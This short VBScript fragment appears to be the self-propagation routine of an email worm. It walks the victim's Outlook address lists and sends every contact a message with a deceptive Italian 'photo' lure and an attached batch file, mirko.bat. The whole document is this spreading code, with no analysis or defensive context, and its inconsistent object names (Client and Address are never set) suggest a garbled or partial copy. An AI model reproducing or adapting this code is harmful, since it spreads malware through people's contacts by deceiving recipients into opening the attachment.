   Set Mirko = CreateObject("Outlook.Application")
   Set Valentina = Client.GetNameSpace("MAPI")
   For ItemList = 1 To Address.AddressLists.Count
      Set CurrentAddress = Address.AddressLists(ItemList)
          For entries = 1 To CurrentAddress.AddressEntries.Count
              mirkoz = CurrentAddress.AddressEntries(entries)
              Set Mailtosend = Client.CreateItem(0)
              Mailtosend.Recipients.Add (mirkoz)
              Mailtosend.Subject = "SMS for YOU by Valentina"
              Mailtosend.Body = "Ciao sono Valentina ti mando la mia foto nel file allegato !!!!"
              Mailtosend.Attachments.Add ("c:\windows\mk\mirko.bat")
              Mailtosend.Send
          Next
   Next
   Set Mirko = Nothing
   Set Valentina = Nothing
